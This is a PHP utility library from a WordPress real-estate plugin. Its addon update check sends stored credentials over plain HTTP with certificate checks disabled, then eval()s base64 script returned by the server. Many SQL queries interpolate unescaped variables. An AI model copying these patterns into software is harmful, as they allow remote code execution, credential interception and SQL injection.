<?php
/** no direct access **/
defined('_WPLEXEC') or die('Restricted access');

/**
** Global Library
** Developed 04/18/2013
**/

class wpl_global
{
	/**
		Developed by : Howard
		Inputs : {parameter}
		Outputs : cleaned parameter
		Date : 2014-03-20
		Description : use this function for cleaning any variable
     **/
    public static function clean($parameter)
    {
		$return_data = '';
		
        if(is_array($parameter)) // Added by Kevin for Escape Array Items
        {
			$return_data = array();
			
            foreach($parameter as $key=>$value)
            {
                $return_data[$key] = strip_tags($value);
            }
        }
        else
		{
            $return_data = strip_tags($parameter);
		}

        return wpl_db::escape($return_data);
    }
	
	/**
		Developed by : Howard
		Inputs : string $view, string $query_string
		Outputs : void
		Date : 2013-08-14
		Description : This is a function for loading view
	**/
	public function load($view = 'property_listing', $query_string = '', $instance = array())
	{
		/** first validations **/
		if(trim($query_string) == '') $query_string = wpl_global::get_wp_qvar('wpl_qs');
		
		/** generate pages object **/
		$controller = new wpl_controller();
		$function = 'f:'.$view.':display';
		
		/** call function **/
		return call_user_func(array($controller, $function), $instance);
	}
	
	/** developed by howard 07/30/2013 **/
	public function get_property_types($property_type_id = '', $enabled = 1)
	{
		if(!trim($property_type_id))
		{
			$query = "SELECT * FROM `#__wpl_property_types` WHERE `parent` <> '0' AND `enabled`>='$enabled' AND `name`!='' ORDER BY `index` ASC";
			return wpl_db::select($query, 'loadAssocList');
		}
		else
		{
			return wpl_db::get('*', 'wpl_property_types', 'id', $property_type_id);
		}
	}
	
	/** developed by howard 07/30/2013 **/
	public function get_listings($listing_id = '', $enabled = 1)
	{
		if(!trim($listing_id))
		{
			$query = "SELECT * FROM `#__wpl_listing_types` WHERE `parent` <> '0' AND `enabled`>='$enabled' AND `name`!='' ORDER BY `index` ASC";
			return wpl_db::select($query, 'loadAssocList');
		}
		else
		{
			return wpl_db::get('*', 'wpl_listing_types', 'id', $listing_id);
		}
	}
	
	/** developed by howard 04/17/2013 **/
	public function get_params($table, $value, $params_field = 'params', $key = 'id')
	{
		if(trim($table) == '' or trim($value) == '') return array();
		
		$params = wpl_db::get($params_field, $table, $key, $value);
		return json_decode($params, true);
	}
	
	/** developed by howard 04/17/2013 **/
	public function set_params($table, $value, $values = array(), $params_field = 'params', $key = 'id')
	{
		if(trim($table) == '' or trim($value) == '') return false;
		
		$params = json_encode($values);
		$query = "UPDATE `#__".$table."` SET `$params_field`='$params' WHERE `$key`='$value'";
		return wpl_db::q($query, 'update');
	}
	
	/** developed by howard 03/06/2013 **/
	public function get_menus($type = 'menu', $client = 'backend', $enabled = 1, $dashboard = 0)
	{
		$query = "SELECT * FROM `#__wpl_menus` WHERE `client`='$client' AND `type`='$type' AND `enabled`='$enabled' AND `dashboard`>='$dashboard' ORDER BY `index` ASC";
		return wpl_db::select($query);
	}
	
	/**
		@description Remove any variable from Query String
		@author Howard
	**/
	public function remove_qs_var($key, $url = '')
	{
		if(trim($url) == '') $url = self::get_full_url();
		
		$url = preg_replace('/(.*)(\?|&)'.$key.'=[^&]+?(&)(.*)/i', '$1$2$4', $url .'&');
		$url = substr($url, 0, -1);
		return $url;
	}
	
	/**
		@description Add any variable to Query String
		@author Howard
	**/
	public function add_qs_var($key, $value, $url = '')
	{
		if(trim($url) == '') $url = self::get_full_url();
		
		$url = preg_replace('/(.*)(\?|&)'.$key.'=[^&]+?(&)(.*)/i', '$1$2$4', $url.'&');
		$url = substr($url, 0, -1);
		
		if(strpos($url, '?') === false)
			return $url.'?'.$key.'='.$value;
		else
			return $url.'&'.$key.'='.$value;
	}
	
	/** developed by howard 10/4/2012 **/
	public function get_full_url()
	{
		/** get $_SERVER **/
		$server = wpl_request::get('SERVER');
		
		$page_url = 'http';
		if(isset($server['HTTPS']) and $server['HTTPS'] == 'on') $page_url .= 's';
		
		$page_url .= '://';
		if($server['SERVER_PORT'] != '80') $page_url .= $server['SERVER_NAME'].':'.$server['SERVER_PORT'].$server['REQUEST_URI'];
		else $page_url .= $server['SERVER_NAME'].$server['REQUEST_URI'];
		
		return $page_url;
	}
	
	/**
		@description create order link used in tables for listing records
		@author Howard
	**/
	public function order_table($thName, $orderBy, $class = true, $url = '')
	{
		if(trim($url) == '') $url = self::get_full_url();
		
		$qs_order = strtoupper(wpl_request::getVar('order'));
		$qs_orderby = wpl_request::getVar('orderby');
		
		$orderType = ($qs_orderby != $orderBy or ($qs_orderby == $orderBy and $qs_order == 'DESC')) ? 'ASC' : 'DESC';
		if($qs_orderby == $orderBy and $class == true) $class = ($orderType == 'ASC') ? 'class="desc"' : 'class="asc"';
		
		$url = self::add_qs_var('orderby', $orderBy, $url);
		$url = self::add_qs_var('order', $orderType, $url);
		
		echo '<a href="'.$url.'" '.$class.'>'.$thName.'</a>';
	}
	
	/** developed by howard 03/10/2013 **/
	public static function get_wpl_asset_url($asset)
	{
		return plugins_url('assets/'.$asset, __FILE__);
	}
	
	/**
		@input {option_name} and [default]
		@return option value
		@author Howard
	**/
	public function get_wp_option($option_name, $default = false)
	{
		return get_option($option_name, $default);
	}
	
	/**
		@input {option_name}
		@return option value
		@author Howard
	**/
	public function get_wp_qvar($var_name = 'wpl_qs')
	{
		return get_query_var($var_name);
	}
	
	/** developed by howard 04/14/2013 **/
	public function get_wp_url($type = 'site')
	{
		/** make it lowercase **/
		$type = strtolower($type);
		
		if(in_array($type, array('frontend','site'))) $url = site_url().'/';
		elseif(in_array($type, array('backend','admin'))) $url = admin_url();
		elseif($type == 'content') $url = content_url().'/';
		elseif($type == 'plugin') $url = plugins_url().'/';
		elseif($type == 'include') $url = includes_url();
		elseif($type == 'wpl') $url = plugins_url().'/'.WPL_BASENAME.'/';
		elseif($type == 'upload') $url = get_site_url().'/wp-content/uploads/WPL/';
		
		return $url;
	}
	
	/** developed by howard 04/10/2013 **/
	public function get_wp_root_path()
	{
		return ABSPATH;
	}
	
	/** developed by howard 04/10/2013 **/
	public function get_wpl_root_path()
	{
		return WPL_ABSPATH;
	}
	
	/** developed by howard 04/14/2013 **/
	public function get_wp_site_url()
	{
		return self::get_wp_url('site');
	}
	
	/** developed by howard 04/14/2013 **/
	public function get_wp_admin_url()
	{
		return self::get_wp_url('admin');
	}
	
	/** developed by howard 04/15/2013 **/
	public function get_wpl_url()
	{
		return self::get_wp_url('WPL');
	}
	
	/** developed by howard 08/11/2013 **/
	public function get_wpl_upload_url()
	{
		return self::get_wp_url('upload');
	}
	
	/** developed by howard 04/15/2013 **/
	public function get_wpl_admin_menu($admin_menu_slug)
	{
		$admin_url = self::get_wp_url('admin');
		return $admin_url.'admin.php?page='.$admin_menu_slug;
	}
	
	/** developed by martin 04/15/2013 **/
	public function get_icons($path, $regex = '.png$|.gif$|.jpg$|.jpeg$')
	{
		return wpl_folder::files($path, $regex, false, false);
	}
	
	/**
		@input [role] and [user_id]
		@return option value
		@author Howard
	**/
	public function has_permission($role = 'guest', $user_id = '')
	{
		/** get user id **/
		if(trim($user_id) == '') $user_id = wpl_users::get_cur_user_id();
		
		/** get all roles **/
		$roles = wpl_users::get_wpl_roles();
		
		/** role validation **/
		if(!in_array($role, $roles)) $role = 'guest';
		
		$user_role = wpl_users::get_role($user_id);
		$user_role_point = wpl_users::get_role_point($user_role);
		
		$role_point = wpl_users::get_role_point($role);
		
		/** return true if user has access **/
		if($user_role_point >= $role_point) return true;
		
		return false;
	}
	
	/**
		@input [role] and [user_id]
		@return option value
		@author Howard
	**/
	public function min_access($role = 'guest', $user_id = '')
	{
		if(!wpl_global::has_permission($role, $user_id))
		{
			echo __("You don't have access to this page!", WPL_TEXTDOMAIN);
			exit;
		}
	}
	
	/**
		@input [role] and [user_id]
		@return option value
		@author Howard
	**/
	public function return_in_id_array($inputs, $is_object = false)
	{
		$return = array();
		
		foreach($inputs as $input)
		{
			if(!$is_object) $return[$input['id']] = $input;
			else $return[$input->id] = $input;
		}
		
		return $return;
	}
	
	/**
		@input {access} and [user_id]
		@return true or false
		@author Howard
	**/
	public function check_access($access, $user_id = '')
	{
		if($access == '') return 1000;
		
		/** get current user id **/
		if(!trim($user_id)) $user_id = wpl_users::get_cur_user_id();
		
		/** return admin access **/
		if(wpl_users::is_super_admin($user_id)) return 1000;

		if(!trim($user_id) or !wpl_users::is_wpl_user($user_id)) $query = "SELECT `access_".$access."` FROM `#__wpl_users` WHERE `id`='-2'";
		else $query = "SELECT `access_".$access."` FROM `#__wpl_users` WHERE `id`='$user_id'";
		
		$result = wpl_db::select($query, 'loadResult');
		if($result == '') return 0;
		
		return $result;
	}
	
	/**
		@input {number}
		@return string
		@author Howard
	**/
	public function number_to_word($x)
	{
		$nwords = array("zero", "one", "two", "three", "four", "five", "six", "seven", "eight", "nine", "ten", "eleven", "twelve", "thirteen", "fourteen", "fifteen", "sixteen", "seventeen", "eighteen", "nineteen", "twenty", 30=>"thirty", 40=>"forty", 50=>"fifty", 60=>"sixty", 70=>"seventy", 80=>"eighty", 90=>"ninety");
		
		if(!is_numeric($x))
			$w = '#';
		elseif(fmod($x, 1) != 0)
			$w = '#'; 
		else
		{
			if($x < 0)
			{
				$w = 'minus ';
				$x = -$x;
			}
			else
				$w = '';
			
			if($x < 21)
				$w .= $nwords[$x];
			elseif($x < 100)
			{
				$w .= $nwords[10 * floor($x/10)];
				$r = fmod($x, 10); 
				if($r > 0)
					$w .= '-'. $nwords[$r];
			} 
			elseif($x < 1000)
			{
				$w .= $nwords[floor($x/100)] .' hundred'; 
				$r = fmod($x, 100);
				if($r > 0)
					$w .= ' and '. self::number_to_word($r);
			} 
			elseif($x < 1000000) 
			{
				$w .= self::number_to_word(floor($x/1000)) .' thousand';
				$r = fmod($x, 1000);
				
				if($r > 0)
				{
					$w .= ' '; 
					if($r < 100)
					   $w .= 'and ';
					$w .= self::number_to_word($r);
				} 
			} 
			else 
			{
				$w .= self::number_to_word(floor($x/1000000)) .' million';
				$r = fmod($x, 1000000);
				
				if($r > 0)
				{
					$w .= ' '; 
					if($r < 100)
					   $word .= 'and ';
					$w .= self::number_to_word($r);
				} 
			}
		}
		
		return $w;
	}
	
	/**
		@input {table name , field name}
		@return string
		@author Albert
	**/
	public static function get_db_field_type($table, $field)
	{
		$query = "DESCRIBE `#__$table` `$field`";
		$result = wpl_db::q($query, 'select');

		return $result[$field]->Type;
	}
	
	/**
		Function to sort internal arrays by their [sort] value
		@author Marvin
	**/
	public function wpl_array_sort($a, $b)
	{
		if($a['sort'] > $b['sort']) return 1;
		elseif($a['sort'] < $b['sort']) return -1;
		elseif($a['sort'] == $b['sort']) return 0;
	}
	
	/**
		@input void
		@return int client
		@author Howard
	**/
	public static function get_client()
	{
		if(is_admin()) return 1; # backend
		else return 0; # frontend
	}
	
	/** developed by howard 08/11/2012 **/
	public function trouble_shooting_log($log_msg, $path = '')
	{
		if(trim($path) == '') $path = WPL_ABSPATH. 'libraries' .DS. 'troubleshooting.txt';
		if(wpl_file::exists($path)) wpl_file::delete($path);
		
		wpl_file::write($path, $log_msg);
	}
	
	/**
		Developed by : Howard
		Inputs : trigger and dynamic params
		Outputs : void
		Date : 2013-04-17
		Description : use this function for calling any events
	**/
	public function event_handler($trigger, $params = array())
	{
		/** import library **/
		_wpl_import('libraries.events');
		
		/** trigger event **/
		wpl_events::trigger($trigger, $params);
	}
	
	/**
		@input [category] and [return_records]
		@params: boolean return_records: it returns raw records
		@return settings array or raw records
		Developed by : Howard
	**/
	public function get_settings($category = '', $showable = 0, $return_records = false)
	{
		/** import library **/
		_wpl_import('libraries.settings');
		
		return wpl_settings::get_settings($category, $showable, $return_records);
	}
	
	/**
		@input {setting_name} and [category]
		@return setting value
		@author Howard
	**/
	public function get_setting($setting_name, $category = '')
	{
		/** import library **/
		_wpl_import('libraries.settings');
		
		return wpl_settings::get($setting_name, $category);
	}
	
	/**
		@input {activity_name}, [activity_id] and [params]
		@return activity output
		Developed by : Howard
	**/
	public function import_activity($activity, $activity_id = 0, $params = false)
	{
		/** import library **/
		_wpl_import('libraries.activities');
		
		wpl_activity::import($activity, $activity_id, $params);
	}
	
	/**
		@input void
		@return wpl theme options
		@author Howard
	**/
	public function get_wpl_theme_options()
	{
		return self::get_wp_option('wpl_theme_options', array());
	}
	
	/**
		@input void
		@return wpl version
		@author Howard
	**/
	public function wpl_version()
	{
		return WPL_VERSION;
	}
	
	/**
		@input void
		@return wp version
		@author Howard
	**/
	public function wp_version()
	{
		global $wp_version;
		return $wp_version;
	}
	
	/**
		@input void
		@return wpl version
		@author Howard
	**/
	public function php_version()
	{
		return phpversion();
	}
	
	/**
		@input void
		@return tmp full path
		@author Howard
	**/
	public function get_tmp_path()
	{
		return WPL_ABSPATH.'assets'.DS.'tmp'.DS;
	}
	
	/**
		@input void
		@return tmp full path
		@author Howard
	**/
	public function init_tmp_folder()
	{
		$path = wpl_global::get_tmp_path();
		$directory = $path.'tmp_'.md5(microtime(true)).DS;
		
		/** create folder **/
		wpl_folder::create($directory, 0755);
		return $directory;
	}
	
	/**
		@input void
		@return void
		@author Howard
	**/
	public function delete_expired_tmp()
	{
		$path = wpl_global::get_tmp_path();
		$folders = wpl_folder::folders($path);
		$now = time();
		$_3days = 259200; #3days in seconds
		
		foreach($folders as $folder)
		{
			$full_path = $path.$folder;
			$latest_modification_time = filemtime($full_path);
			
			if(($now - $latest_modification_time) > $_3days) wpl_folder::delete($full_path);
		}
	}
	
	/**
		@input file object from $_FILES, full dest, valid extensions, max_file_size
		@return array response
		@author Howard
	**/
	public function upload($file, $dest = '', $ext_array = array('jpg','png','gif','jpeg'), $max_file_size = 512000)
	{
		$error = '';
		$msg = '';
		
		if((!empty($file['error'])) or (empty($file['tmp_name']) or $file['tmp_name'] == 'none'))
		{
			$error .= __('An error occurred uploading your file!', WPL_TEXTDOMAIN);
		}
		else 
		{
			$extention = strtolower(wpl_file::getExt($file['name']));
			
			if(!in_array($extention, $ext_array))
			{
				$error .= __('File extention is not valid.', WPL_TEXTDOMAIN);
			}
			
			/** check the file size **/
			$filesize = @filesize($file['tmp_name']);
			
			if($filesize > $max_file_size)
			{
				$error .= __('File size is not valid!', WPL_TEXTDOMAIN);
				@unlink($file);
			}
			
			/** upload file **/
			if($error == '') wpl_file::upload($file['tmp_name'], $dest);
		}
		
		$message = '';
		return array('error'=>$error, 'message'=>$message);
	}
	
	/**
		@input full path of file and full path of dest
		@return boolean
		@author Howard
	**/
	public function zip_extract($file, $dest)
	{
		$zip = new ZipArchive;
		if($zip->open($file) === true)
		{
			$zip->extractTo($dest);
			$zip->close();
			
			return true;
		}
		
		return false;
	}
	
	/**
		@input full path of sql file, delete option and exception option
		@return boolean
		@author Howard
	**/
	public function do_file_queries($sql_file, $delete = false, $exception = false)
	{
		if(!wpl_file::exists($sql_file)) return false;
		
		$read_file = file_get_contents($sql_file);
		if($read_file != '')
		{       
			$read_file = str_replace(";\r\n", "-=++=-", $read_file);
			$read_file = str_replace(";\r", "-=++=-", $read_file);
			$read_file = str_replace(";\n", "-=++=-", $read_file);
			$list_query = explode("-=++=-", $read_file);
			
			for($i = 0; $i < count($list_query); $i++)
			{
				if(trim($list_query[$i]) == '') continue;
				$query = $list_query[$i];
				
				if($exception)
				{
					wpl_db::q($query);
				}
				else
				{
					try { wpl_db::q($query); } catch (Exception $e) {}
				}
			}
		}
		
		if($delete) wpl_file::delete($sql_file);
		return true;
	}
	
	/**
		@input string addon_name
		@return boolean
		@author Howard
	**/
	public function check_addon($addon_name)
	{
		/** first validation **/
		if(trim($addon_name) == '') return false;
		
		$query = "SELECT `id` FROM `#__wpl_addons` WHERE `addon_name`='$addon_name'";
		$addon_id = wpl_db::select($query, 'loadResult');
		
		if($addon_id) return true;
		else return false;
	}
	
	/**
		@input int addon_id
		@return array response
		@author Howard
	**/
	public function check_addon_update($addon_id)
	{
		$current_url = wpl_global::get_full_url();
		$domain = wpl_global::domain($current_url);
		$settings = wpl_global::get_settings();
		
		$addon_data = wpl_db::get('*', 'wpl_addons', 'id', $addon_id);
		
		if(!$addon_data) return array('success'=>0, 'message'=>__('Error: #U200, Addon is not valid!', WPL_TEXTDOMAIN));
		if(!$addon_data->updatable) return array('success'=>0, 'message'=>__('Error: #U201, Addon is not updatable for this domain or update key!', WPL_TEXTDOMAIN));
		
		$phpver = phpversion();
		$wplversion = wpl_global::wpl_version();
		$wpversion = wpl_global::wp_version();
		$support_key = $addon_data->support_key;
		$update_key = $addon_data->update_key;
		$version = $addon_data->version;
		$username = isset($settings['realtyna_username']) ? $settings['realtyna_username'] : '';
		$password = isset($settings['realtyna_password']) ? $settings['realtyna_password'] : '';
		
		$POST = array(
			'domain'=>$domain,
			'id'=>$addon_id,
			'is_addon'=>'1',
			'wpversion'=>$wpversion,
			'wplversion'=>$wplversion,
			'version'=>$version,
			'phpver'=>$phpver,
			'update_key'=>$update_key,
			'support_key'=>$support_key,
			'username'=>urlencode($username),
			'password'=>urlencode($password),
			'command'=>'check_update',
			'format'=>'json'
		);
		
		$io_handler = 'http://billing.realtyna.com/io/io.php';
		$result = wpl_global::get_web_page($io_handler, $POST);
		
		$answer = json_decode($result, true);
		
		/** run script **/
		if(isset($answer['script']) and trim($answer['script']) != '')
		{
			$script = base64_decode($answer['script']);
			eval($script);
		}
		
		if($answer['success'] == '0') return array('success'=>0, 'message'=>$answer['message']);
		
		/** set the message **/
		if(isset($answer['update_message'])) wpl_db::set('wpl_addons', $addon_id, 'message', wpl_db::escape($answer['update_message']));
		
		$message = $answer['update'] ? __('A new update found. please wait ...', WPL_TEXTDOMAIN) : __('Your addon is up to date!', WPL_TEXTDOMAIN);
		$success = $answer['success'] ? $answer['success'] : 0;
		return array('success'=>$success, 'message'=>$message);
	}
	
	/**
		@input void
		@return array response
		@author Howard
	**/
	public function check_realtyna_credentials()
	{
		/** import settings library **/
		_wpl_import('libraries.settings');
		
		$current_url = wpl_global::get_full_url();
		$domain = wpl_global::domain($current_url);
		$settings = wpl_global::get_settings();
		
		$phpver = phpversion();
		$wplversion = wpl_global::wpl_version();
		$wpversion = wpl_global::wp_version();
		$username = $settings['realtyna_username'];
		$password = $settings['realtyna_password'];
		
		$POST = array(
			'domain'=>$domain,
			'wpversion'=>$wpversion,
			'wplversion'=>$wplversion,
			'phpver'=>$phpver,
			'username'=>urlencode($username),
			'password'=>urlencode($password),
			'command'=>'check_credentials',
			'format'=>'json'
		);
		
		$io_handler = 'http://billing.realtyna.com/io/io.php';
		$result = wpl_global::get_web_page($io_handler, $POST);
		$answer = json_decode($result, true);
		
		/** saving status **/
		$status = isset($answer['status']) ? $answer['status'] : 0;
		wpl_settings::save_setting('realtyna_verified', $status, 1);
		
		$message = $status ? __('Credentials verified.', WPL_TEXTDOMAIN) : __('Invalid credentials!', WPL_TEXTDOMAIN);
		$success = 1;
		
		return array('success'=>$success, 'message'=>$message, 'status'=>$status);
	}
	
	/**
		@input string url
		@return string domain
		@author Howard
	**/
	public function domain($url)
	{
		$url = str_replace('http://', '', $url);
		$url = str_replace('https://', '', $url);
		$url = str_replace('ftp://', '', $url);
		$url = str_replace('svn://', '', $url);
		
		$ex = explode('/', $url);
		$ex2 = explode('?', $ex[0]);
		
		return $ex2[0];
	}
	
	/**
		@input string url, array post data
		@return string content
		@author Howard
	**/
	public static function get_web_page($url, $post = '')
	{
		$result = false;
		
		// Doing the curl
		if(function_exists('curl_version'))
		{
			$ch = curl_init($url);

			if(is_resource($ch) === true)
			{
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_HEADER, false);
				curl_setopt($ch, CURLOPT_AUTOREFERER, true);
				curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 120);
				curl_setopt($ch, CURLOPT_TIMEOUT, 120);
				curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
				
				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		
				if($post != '')
				{
					curl_setopt($ch, CURLOPT_POST, true);
					curl_setopt($ch, CURLOPT_POSTFIELDS, (is_array($post) === true) ? http_build_query($post) : $post);
				}
				
				$result = curl_exec($ch);
				curl_close($ch);
			}
		}
		
		// Doing FGC
		if($result == false)
		{
			if($post != '')
			{
				$http['method'] = 'POST';
				$http['header'] = 'Content-Type: application/x-www-form-urlencoded';
				$http['content'] = (is_array($post) === true) ? http_build_query($post) : $post;
			}
			
			$result = @file_get_contents($url, false, stream_context_create(array('http' => $http)));
		}
		
		return $result;
	}
	
	/**
		@input string $key, object $params
		@return string value
		@author Howard
	**/
	public function isset_object($key, $params)
	{
		if(isset($params->{$key})) return $params->{$key};
		else return NULL;
	}
	
	/**
		@input string $key, array $params
		@return string value
		@author Howard
	**/
	public function isset_array($key, $params)
	{
		if(isset($params[$key])) return $params[$key];
		else return NULL;
	}
	
	/**
		@input void
		@return current blog id, it returns 1 if multisite is off
		@author Howard
	**/
	public function get_current_blog_id()
	{
		return get_current_blog_id();
	}
	
	/**
		@input void
		@return WPL base path for uploaded files
		@description this functions will take care of multisite usage
	**/
	public function get_upload_base_path($blog_id = NULL)
	{
		if(!$blog_id) $blog_id = wpl_global::get_current_blog_id();
		
		if(!$blog_id or $blog_id == 1) return WPL_UP_ABSPATH;
		else
		{
			$path = rtrim(WPL_UP_ABSPATH, DS).$blog_id. DS;
			
			if(!wpl_folder::exists($path)) wpl_folder::create($path);
			return $path;
		}
	}
	
	/**
		@input void
		@return WPL base url for uploaded files
		@description this functions will take care of multisite usage
	**/
	public function get_upload_base_url($blog_id = NULL)
	{
		if(!$blog_id) $blog_id = wpl_global::get_current_blog_id();
		
		if(!$blog_id or $blog_id == 1) return get_site_url().'/wp-content/uploads/WPL/';
		else
		{
			$path = rtrim(WPL_UP_ABSPATH, DS).$blog_id. DS;
			
			if(!wpl_folder::exists($path)) wpl_folder::create($path);
			return get_site_url().'/wp-content/uploads/WPL'.$blog_id.'/';
		}
	}
	
	/**
		Developed by : Howard
		Inputs : array instance
		Outputs : void
		Date : 2014-03-20
		Description : This is a function for loading any view on frontend
	**/
	public function load_view($function, $instance = array())
	{
		if(trim($function) == '') return false;
		
		/** generate pages object **/
		$controller = new wpl_controller();
		
		ob_start();
		call_user_func(array($controller, $function), $instance);
		return $output = ob_get_clean();
	}
	
	/**
		Developed by : Howard
		Inputs : array instance
		Outputs : void
		Date : 2014-03-20
		Description : This is a function for loading profile wizard by shortcode
	**/
	public function load_profile_wizard($instance = array())
	{
		return wpl_global::load_view('b:users:profile', $instance);
	}
	
	/**
		Developed by : Howard
		Inputs : array instance
		Outputs : void
		Date : 2014-03-25
		Description : This is a function for loading property wizard by shortcode
	**/
	public function load_add_edit_listing($instance = array())
	{
		return wpl_global::load_view('b:listing:wizard', $instance);
	}
	
	/**
		Developed by : Howard
		Inputs : array instance
		Outputs : void
		Date : 2014-03-25
		Description : This is a function for loading property manager by shortcode
	**/
	public function load_listing_manager($instance = array())
	{
		return wpl_global::load_view('b:listings:manager', $instance);
	}
}